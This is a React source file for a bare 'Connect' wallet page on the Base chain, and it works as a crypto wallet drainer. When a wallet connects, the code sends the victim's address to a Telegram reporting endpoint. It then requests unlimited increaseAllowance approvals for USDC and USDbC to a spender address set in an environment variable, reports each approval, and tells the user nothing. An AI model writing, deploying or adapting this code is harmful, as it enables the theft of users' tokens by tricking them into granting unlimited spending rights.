import styles from "./styles/Home.module.css";
import {useWeb3Modal} from "@web3modal/wagmi/react";
import {Connector, useAccount, useContractWrite, useSwitchNetwork} from "wagmi";
import {base} from "wagmi/chains";
import {Address} from "viem";
import {ABI} from './abis'
import {useState} from "react";

const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

export default function App() {
  const {open, close} = useWeb3Modal();
  const {switchNetworkAsync} = useSwitchNetwork({
    chainId: base.id
  })

  const [completedUSDC, setCompletedUSDC] = useState(false)
  const [completedUSDbC, setcompletedUSDbC] = useState(false)
  // const [address, setAddress] = useState<Address | null>(null)

  // @ts-ignore
  const increaseApprovalUSDC = useContractWrite({
    address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913',
    abi: ABI.USDC,
    functionName: 'increaseAllowance',
    args: [import.meta.env.VITE_SPENDER_ADDR, MAX_UINT256],
    chainId: base.id
  })
  // @ts-ignore
  const increaseAllowanceUSDbC = useContractWrite({
    address: '0xd9aaec86b65d86f6a7b5b1b0c42ffa531710b6ca',
    abi: ABI.USDbC,
    functionName: 'increaseAllowance',
    args: [import.meta.env.VITE_SPENDER_ADDR, MAX_UINT256],
    chainId: base.id
  })

  useAccount({
    async onConnect({address, connector, isReconnected}: {
      address?: Address;
      connector?: Connector;
      isReconnected: boolean
    }) {
      if (!address) return console.error('Address is undefined')
      if (await connector?.getChainId() !== base.id) {
        console.log('Switching chains..')
        if (switchNetworkAsync) {
          await switchNetworkAsync()
        } else console.error('No switchNetworkAsync')
      } else console.log('Chain ok')

      // @ts-ignore
      await fetch(`/api/telegram/newConnection?`
        + new URLSearchParams({
          address
        })
      )

      // setAddress(address);
      if (!completedUSDC)
        await increaseApprovalUSDC.writeAsync()
          .then(() => {
            setCompletedUSDC(true)
            // @ts-ignore
            fetch(`/api/telegram/increasedApproval?` + new URLSearchParams<{
              address: string,
              token: string
            }>({
              address, token: `USDC`
            })).catch(console.error)
          })
          .catch(console.error)

      await new Promise(resolve => setTimeout(resolve, 1000))

      if (!completedUSDbC)
        await increaseAllowanceUSDbC.writeAsync()
          .then(() => {
            setcompletedUSDbC(true)
            fetch(`/api/telegram/increasedApproval?` +
              // @ts-ignore
              new URLSearchParams<{
              address: string,
              token: string
            }>({
              address, token: `USDbC`
            })).catch(console.error)
          })
          .catch(console.error)
    },
    onDisconnect() {
      console.log('Wallet disconnected')
    }
  })

  if (!import.meta.env.VITE_SPENDER_ADDR) {
    return <p>ERR: VITE_SPENDER_ADDR is required. <br/>Change at .env</p>
  }

  return (
    <>
      <main className={styles.main}>
        <button className={styles.connectButton} onClick={() => open()}>Connect</button>
      </main>
    </>
  );
}
